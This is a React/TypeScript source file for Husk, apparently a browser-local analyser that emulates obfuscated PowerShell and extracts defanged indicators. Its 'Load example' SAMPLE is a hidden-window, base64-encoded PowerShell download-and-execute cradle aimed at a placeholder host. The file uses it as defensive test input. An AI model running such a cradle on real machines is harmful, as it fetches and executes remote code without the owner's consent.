// Husk - PowerShell deobfuscation and IOC extraction, fully browser-local.
// Copyright (c) 2026 Mo (@Mo4n6) - https://github.com/Mo4n6/tools
//
import { useCallback, useMemo, useState } from 'react';

import { HUSK_AUTHOR, HUSK_AUTHOR_URL, HUSK_COPYRIGHT, HUSK_SOURCE_URL } from './attribution';
import type { GapRecord } from './core/gaps';
import type { Ioc, IocKind } from './ioc/types';
import { useHusk } from './useHusk';

const panel =
  'rounded-md border border-emerald-500/30 bg-[#07110a] p-3 text-sm text-emerald-100';
const primaryAction =
  'rounded-md border border-emerald-400 bg-emerald-500/15 px-3 py-2 text-sm text-emerald-100 hover:border-emerald-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 disabled:opacity-40';
const secondaryAction =
  'rounded-md border border-emerald-500/40 bg-[#07110a] px-3 py-2 text-sm text-emerald-100 hover:border-emerald-300/70 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 disabled:opacity-40';

const IOC_LABELS: Record<IocKind, string> = {
  url: 'URLs',
  ipv4: 'IP addresses',
  domain: 'Domains',
  email: 'Email addresses',
  filepath: 'File paths',
  registry: 'Registry keys',
  'scheduled-task': 'Scheduled tasks',
  mutex: 'Mutexes',
  hash: 'Hashes',
  'base64-blob': 'Base64 blobs',
  pe: 'Embedded PE',
};

const GAP_LABELS: Record<GapRecord['kind'], { label: string; tone: string }> = {
  GAP: { label: 'Unimplemented', tone: 'text-amber-300 border-amber-500/40' },
  STUB_BY_DESIGN: { label: 'Stubbed by design', tone: 'text-emerald-300 border-emerald-500/40' },
  HARD_BLOCK: { label: 'Cannot be resolved', tone: 'text-rose-300 border-rose-500/40' },
};

const SAMPLE = String.raw`powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAJwApAA==`;

const HuskApp = (): JSX.Element => {
  const [source, setSource] = useState('');
  const [copied, setCopied] = useState<string | null>(null);
  const { state, run, reset } = useHusk();

  const result = state.result;

  const handleRun = useCallback(() => run(source), [run, source]);

  const handleClear = useCallback(() => {
    setSource('');
    reset();
  }, [reset]);

  const copy = useCallback((label: string, text: string) => {
    void navigator.clipboard?.writeText(text).then(
      () => {
        setCopied(label);
        window.setTimeout(() => setCopied(null), 1500);
      },
      () => setCopied(null),
    );
  }, []);

  const iocGroups = useMemo(() => {
    if (!result) return [];
    return [...result.iocs.byKind.entries()].sort((a, b) => a[0].localeCompare(b[0]));
  }, [result]);

  const defangedList = useMemo(
    () => result?.iocs.indicators.map((i) => `${i.kind}\t${i.defanged}`).join('\n') ?? '',
    [result],
  );

  const gapIssue = useMemo(() => buildIssueText(result?.gaps ?? []), [result]);

  return (
    <div className="flex w-full flex-col p-2 font-mono text-emerald-100 md:p-4">
      <header className="mb-4">
        <h1 className="text-3xl font-bold">Husk</h1>
        <p className="mt-2 max-w-3xl text-sm text-emerald-300/70">
          Paste obfuscated PowerShell. Husk emulates it rather than running it: the computational
          half of the language is evaluated for real, every dangerous construct is recorded instead
          of performed, and each <code>IEX</code> becomes a layer you can read. Analysis happens in
          this tab and makes no network requests.
        </p>
      </header>

      <div className="grid gap-4 lg:grid-cols-2">
        <section className="flex flex-col gap-2">
          <label className="text-xs uppercase tracking-wide text-emerald-300/60" htmlFor="husk-input">
            Sample
          </label>
          <textarea
            id="husk-input"
            className="h-64 w-full resize-y rounded-md border border-emerald-500/30 bg-[#07110a] p-3 text-xs text-emerald-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400"
            spellCheck={false}
            placeholder="Paste a PowerShell sample…"
            value={source}
            onChange={(event) => setSource(event.target.value)}
          />
          <div className="flex flex-wrap gap-2">
            <button className={primaryAction} onClick={handleRun} disabled={state.status === 'running'}>
              {state.status === 'running' ? 'Analysing…' : 'Analyse'}
            </button>
            <button className={secondaryAction} onClick={handleClear}>
              Clear
            </button>
            <button className={secondaryAction} onClick={() => setSource(SAMPLE)}>
              Load example
            </button>
          </div>

          {state.status === 'error' ? (
            <p className={`${panel} border-rose-500/40 text-rose-200`}>{state.error}</p>
          ) : null}
        </section>

        <section className="flex flex-col gap-3">
          {!result ? (
            <div className={`${panel} text-emerald-300/60`}>
              Results appear here. Nothing is sent anywhere.
            </div>
          ) : (
            <>
              <div className={panel}>
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="text-xs uppercase tracking-wide text-emerald-300/60">
                    {result.layers.length} layer{result.layers.length === 1 ? '' : 's'} ·{' '}
                    {result.iocs.indicators.length} indicator
                    {result.iocs.indicators.length === 1 ? '' : 's'} · {result.elapsedMs}ms
                  </span>
                  <span
                    className={`rounded border px-2 py-0.5 text-xs ${
                      result.reliable
                        ? 'border-emerald-500/40 text-emerald-300'
                        : 'border-amber-500/40 text-amber-300'
                    }`}
                  >
                    {result.reliable ? 'Fully resolved' : 'Incomplete — see fidelity'}
                  </span>
                </div>
                {result.iocs.hasEmbeddedPe ? (
                  <p className="mt-2 text-xs text-rose-300">
                    An embedded PE (MZ header) was found in a decoded blob.
                  </p>
                ) : null}
              </div>

              {iocGroups.length > 0 ? (
                <div className={panel}>
                  <div className="mb-2 flex items-center justify-between gap-2">
                    <h2 className="text-sm font-bold">Indicators</h2>
                    <button
                      className="text-xs text-emerald-300/70 underline hover:text-emerald-200"
                      onClick={() => copy('iocs', defangedList)}
                    >
                      {copied === 'iocs' ? 'Copied' : 'Copy defanged'}
                    </button>
                  </div>
                  <div className="flex flex-col gap-3">
                    {iocGroups.map(([kind, list]) => (
                      <IocGroup key={kind} kind={kind} list={list} />
                    ))}
                  </div>
                </div>
              ) : null}

              {result.events.length > 0 ? (
                <div className={panel}>
                  <h2 className="mb-2 text-sm font-bold">Recorded calls</h2>
                  <p className="mb-2 text-xs text-emerald-300/60">
                    Recognised and logged, never performed.
                  </p>
                  <ul className="flex flex-col gap-1 text-xs">
                    {result.events.map((event, index) => (
                      <li key={`${event.signature}-${index}`} className="break-all">
                        <span className="text-emerald-300/60">[{event.category}]</span>{' '}
                        <span className="text-emerald-200">{event.signature}</span>{' '}
                        <span className="text-emerald-100/70">{event.args.join(' , ')}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              ) : null}

              <div className={panel}>
                <h2 className="mb-2 text-sm font-bold">Layers</h2>
                <div className="flex flex-col gap-2">
                  {result.layers.map((layer) => (
                    <details key={layer.index} open={layer.index === result.layers.length - 1}>
                      <summary className="cursor-pointer text-xs text-emerald-300/70">
                        Layer {layer.index}
                        {layer.origin.via === 'input'
                          ? ' · pasted input'
                          : layer.origin.via === 'decode'
                            ? ` · ${layer.origin.transform}`
                            : ` · ${layer.origin.operator}`}
                      </summary>
                      <pre className="mt-1 max-h-64 overflow-auto whitespace-pre-wrap break-all rounded border border-emerald-500/20 bg-black/30 p-2 text-xs">
                        {layer.source}
                      </pre>
                    </details>
                  ))}
                </div>
              </div>

              <FidelityPanel
                gaps={result.gaps}
                copied={copied === 'gaps'}
                onCopy={() => copy('gaps', gapIssue)}
              />
            </>
          )}
        </section>
      </div>

      <footer className="mt-6 border-t border-emerald-500/20 pt-3 text-xs text-emerald-300/50">
        <span>{HUSK_COPYRIGHT}</span>
        <span aria-hidden="true"> · </span>
        <a
          className="underline hover:text-emerald-200"
          href={HUSK_AUTHOR_URL}
          target="_blank"
          rel="noreferrer noopener"
        >
          @{HUSK_AUTHOR}
        </a>
        <span aria-hidden="true"> · </span>
        <a
          className="underline hover:text-emerald-200"
          href={HUSK_SOURCE_URL}
          target="_blank"
          rel="noreferrer noopener"
        >
          source
        </a>
        <span aria-hidden="true"> · </span>
        <span>
          Lexer tables ported from PowerShell (MIT), Copyright (c) Microsoft Corporation.
        </span>
      </footer>
    </div>
  );
};

const IocGroup = ({ kind, list }: { kind: IocKind; list: readonly Ioc[] }): JSX.Element => (
  <div>
    <h3 className="text-xs uppercase tracking-wide text-emerald-300/60">
      {IOC_LABELS[kind] ?? kind} ({list.length})
    </h3>
    <ul className="mt-1 flex flex-col gap-1 text-xs">
      {list.map((ioc) => (
        <li key={`${ioc.kind}-${ioc.value}`} className="break-all">
          <span className="text-emerald-100">{ioc.defanged}</span>
          <span className="text-emerald-300/50">
            {' '}
            · layer {ioc.layer}
            {ioc.occurrences > 1 ? ` · ×${ioc.occurrences}` : ''}
            {ioc.confidence === 'medium' ? ' · possible' : ''}
          </span>
        </li>
      ))}
    </ul>
  </div>
);

const FidelityPanel = ({
  gaps,
  copied,
  onCopy,
}: {
  gaps: readonly GapRecord[];
  copied: boolean;
  onCopy: () => void;
}): JSX.Element | null => {
  if (gaps.length === 0) return null;

  return (
    <div className={panel}>
      <div className="mb-2 flex items-center justify-between gap-2">
        <h2 className="text-sm font-bold">Fidelity</h2>
        <button className="text-xs text-emerald-300/70 underline hover:text-emerald-200" onClick={onCopy}>
          {copied ? 'Copied' : 'Copy as issue'}
        </button>
      </div>
      <p className="mb-2 text-xs text-emerald-300/60">
        What Husk could not resolve, ranked by how far it spread.
      </p>
      <ul className="flex flex-col gap-1 text-xs">
        {gaps.slice(0, 24).map((gap) => (
          <li key={gap.id} className="break-all">
            <span className={`mr-2 rounded border px-1 ${GAP_LABELS[gap.kind].tone}`}>
              {GAP_LABELS[gap.kind].label}
            </span>
            <span className="text-emerald-100">{gap.signature}</span>
            <span className="text-emerald-300/50">
              {' '}
              · layer {gap.provenance.layer}
              {gap.blastRadius > 0 ? ` · reached ${gap.blastRadius} value${gap.blastRadius === 1 ? '' : 's'}` : ''}
              {gap.reachedOutput ? ' · affects output' : ''}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
};

/**
 * A ready-to-file issue body. Only signatures and positions - argument values
 * can contain payload, which is fine locally and not fine in a public issue.
 */
function buildIssueText(gaps: readonly GapRecord[]): string {
  const actionable = gaps.filter((g) => g.kind === 'GAP');
  if (actionable.length === 0) return 'No unimplemented constructs.';

  const lines = [
    '### Husk: unimplemented constructs',
    '',
    '| Signature | Layer | Blast radius | Affects output |',
    '| --- | --- | --- | --- |',
    ...actionable.map(
      (g) =>
        `| \`${g.signature}\` | ${g.provenance.layer} | ${g.blastRadius} | ${g.reachedOutput ? 'yes' : 'no'} |`,
    ),
    '',
    '_Argument values omitted: they may contain payload._',
  ];
  return lines.join('\n');
}

export default HuskApp;
